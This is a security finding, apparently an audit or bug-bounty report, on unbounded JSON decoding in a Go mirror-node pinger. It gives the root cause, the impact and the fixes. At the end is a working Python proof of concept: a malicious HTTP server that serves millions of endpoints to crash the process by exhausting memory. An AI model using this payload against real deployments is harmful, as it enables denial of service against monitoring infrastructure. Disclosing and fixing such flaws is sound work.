### Title
Unbounded Memory Allocation via Malicious Mirror Node Response in `fetchMirrorNodeNetwork()`

### Summary
`fetchMirrorNodeNetwork()` in `pinger/mirror_node_client.go` decodes the mirror node HTTP response body with no size cap and builds a `network` map with no bound on the number of entries. An attacker who can control the mirror node response (e.g., via HTTP MITM, DNS poisoning, or a compromised mirror node) can return a crafted JSON payload containing millions of unique `host:port` combinations, causing the Go runtime to exhaust heap memory and crash the pinger process, permanently stopping all liveness pings.

### Finding Description
**Exact code path**: `pinger/mirror_node_client.go`, `fetchMirrorNodeNetwork()`, lines 95–124.

**Root cause — three compounding missing limits:**

1. **No response body size limit** (line 96):
   ```go
   if err := json.NewDecoder(resp.Body).Decode(&payload); err != nil {
   ```
   `resp.Body` is passed directly to `json.NewDecoder` with no `io.LimitReader` wrapper. The decoder will read and allocate memory for an arbitrarily large response body.

2. **No cap on `payload.Nodes` length** (line 102):
   ```go
   for _, n := range payload.Nodes {
   ```
   The decoded slice can contain an unbounded number of `nodeEntry` objects.

3. **No cap on `ServiceEndpoints` per node or total `network` map entries** (lines 113–124):
   ```go
   for _, ep := range n.ServiceEndpoints {
       ...
       addr := net.JoinHostPort(host, fmt.Sprintf("%d", ep.Port))
       network[addr] = nodeAccountId
   }
   ```
   Every unique `host:port` pair is inserted into the `network` map with no size check.

**The only existing protection** is the `http.Client{Timeout: cfg.mirrorNodeClientTimeout}` (default 10 s, `config.go` line 130). On a local or fast network, tens to hundreds of megabytes of JSON can be transferred within 10 seconds, sufficient to trigger OOM. The timeout does not bound memory — it only bounds wall-clock time.

**Exploit flow:**
- Attacker serves a crafted JSON response at the mirror node endpoint.
- `json.NewDecoder(...).Decode(&payload)` allocates the full `payload.Nodes` slice in heap memory.
- The nested loop inserts every unique `addr` string into the `network` map — each map entry allocates a string key plus a `hiero.AccountID` value.
- Go's runtime OOM killer terminates the process.

### Impact Explanation
The pinger process is the sole writer of `/tmp/alive` (written every 15 s by the goroutine in `main.go` lines 28–39). A fatal OOM crash stops that goroutine, causing the Kubernetes liveness exec probe to fail and the pod to be restarted or marked unhealthy. This halts all liveness pings to the Hedera network, breaking the monitoring/alerting chain for a network that represents ≥25% of market capitalization. The crash is repeatable: every restart re-calls `buildNetworkFromMirrorNodes` → `fetchMirrorNodeNetwork`, so the attacker can crash the pinger on every startup cycle.

### Likelihood Explanation
The attack requires controlling the mirror node HTTP response. Realistic vectors without privileged access to the pinger host:
- **HTTP deployment** (`mirrorRest = "http://..."`, the example in `config.go` line 37 shows `http://mirror-rest:5551`): a network-adjacent attacker (same pod network, same VPC, or ARP/BGP poisoning) can MITM the plaintext HTTP connection.
- **DNS poisoning**: if the mirror node is addressed by hostname, an attacker with DNS influence redirects the pinger to a malicious server.
- **Compromised or malicious mirror node**: a third-party or community-run mirror node that the pinger is configured to trust.

No credentials, no access to the pinger process, and no kernel exploits are required.

### Recommendation
Apply all three fixes:

1. **Wrap `resp.Body` with `io.LimitReader`** before decoding, e.g. a 10 MB cap:
   ```go
   const maxBodyBytes = 10 << 20 // 10 MiB
   if err := json.NewDecoder(io.LimitReader(resp.Body, maxBodyBytes)).Decode(&payload); err != nil {
   ```

2. **Cap the number of nodes processed**:
   ```go
   const maxNodes = 500
   if len(payload.Nodes) > maxNodes {
       payload.Nodes = payload.Nodes[:maxNodes]
   }
   ```

3. **Cap the number of entries inserted into `network`**:
   ```go
   const maxNetworkEntries = 5000
   if len(network) >= maxNetworkEntries {
       break
   }
   ```

4. **Enforce HTTPS** for the mirror node REST URL and validate the server certificate to eliminate MITM as an attack vector.

### Proof of Concept
```python
# Serve a malicious mirror node response
import json, http.server, socketserver

# Generate 2,000,000 unique host:port entries across 1,000 nodes
nodes = []
for i in range(1000):
    endpoints = [
        {"domain_name": f"attacker-{i}-{j}.example.com",
         "ip_address_v4": "", "port": 50211}
        for j in range(2000)
    ]
    nodes.append({
        "node_account_id": f"0.0.{3+i}",
        "service_endpoints": endpoints,
        "grpc_proxy_endpoint": None
    })

payload = json.dumps({"nodes": nodes, "links": {"next": None}}).encode()

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(payload)

with socketserver.TCPServer(("0.0.0.0", 5551), Handler) as httpd:
    httpd.serve_forever()
```

Configure the pinger with:
```
HIERO_MIRROR_PINGER_NETWORK=other
HIERO_MIRROR_PINGER_REST=http://<attacker-ip>:5551
```

On startup, `fetchMirrorNodeNetwork` decodes 2,000,000 node entries, allocates a `network` map with 2,000,000 string keys, and the Go process is killed by OOM. The `/tmp/alive` file stops being updated, and the liveness probe fails.
